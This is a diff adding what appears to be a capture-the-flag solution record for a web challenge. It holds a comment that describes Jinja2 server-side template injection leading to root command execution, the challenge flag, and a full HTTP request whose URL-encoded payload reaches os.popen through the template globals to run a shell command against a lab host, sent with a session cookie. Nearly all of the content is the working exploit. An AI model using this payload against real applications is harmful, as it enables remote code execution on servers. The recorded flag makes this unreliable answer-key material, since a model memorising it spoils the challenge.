@@ -1,0 +1,5 @@
+# SSTI via /remind?date= parameter. Jinja2 template injection via str.format() injection into render_template_string(). Achieved RCE as root. Flag: flag{7e0416f5-d2b9-4faf-94c2-de7a39664d4c}
+
+GET /remind?date=%7B%7Bconfig.__class__.__init__.__globals__%5B%27os%27%5D.popen%28%27id%27%29.read%28%29%7D%7D HTTP/1.1
+Host: 172.17.0.1:54331
+Cookie: session=.eJwlzjEOwyAMRuG7MHcw2NiQy0Tmx6hdk2aqevdG6viWp--T9nXE-Uzb-7jikfbXTFsSqSxGbcUIM1d3ARXlXkqHMhbuFqpgb6PH7GTkBMws3LR6mGd2HjZxXyqaRXVAtWuRqLnYUloO1x7uva2CxsE2wFDxSDfkOuP4a3L6_gC51C_G.adzP8w.vHBzJo4c8I_7bTUlzqSgk_RH3Rs
